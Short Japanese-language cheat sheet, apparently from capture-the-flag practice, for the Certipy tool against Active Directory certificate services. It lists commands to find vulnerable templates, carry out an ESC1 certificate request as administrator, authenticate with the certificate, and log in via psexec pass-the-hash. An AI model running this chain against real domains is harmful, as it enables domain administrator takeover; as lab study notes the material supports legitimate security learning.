# Certipy

https://github.com/ly4k/Certipy

ActiveDirectory の証明書関連の脆弱性の列挙、エクスプロイトツール。

```sh
python3 -m venv certipy-venv
source certipy-venv/bin/activate
pip install certipy-ad
```

脆弱性列挙

```sh
source ~/certipy-venv/bin/activate

certipy-ad find -u name@local.thm -p 'pass' -dc-ip $TARGET -vulnerable
```

## エクスプロイト

ESC16 まである。

### [ESC1](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication)

証明書を要求。sidは、脆弱性列挙したら出力される users.json を見ればわかる。

```sh
certipy req \
    -u 'user@corp.local' -p 'pass' \
    -dc-ip $TARGET -target 'labyrinth.thm.local' \
    -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' \
    -upn 'administrator@thm.local' -sid 'S-1-5-21-...-500'
```

取得した証明書を使用して認証

```sh
certipy auth -pfx 'administrator.pfx' -dc-ip $TARGET
```

pass-the-hash

```sh
psexec.py -hashes aad3b435XXXXX:07d677XXXXXX administrator@$TARGET
```
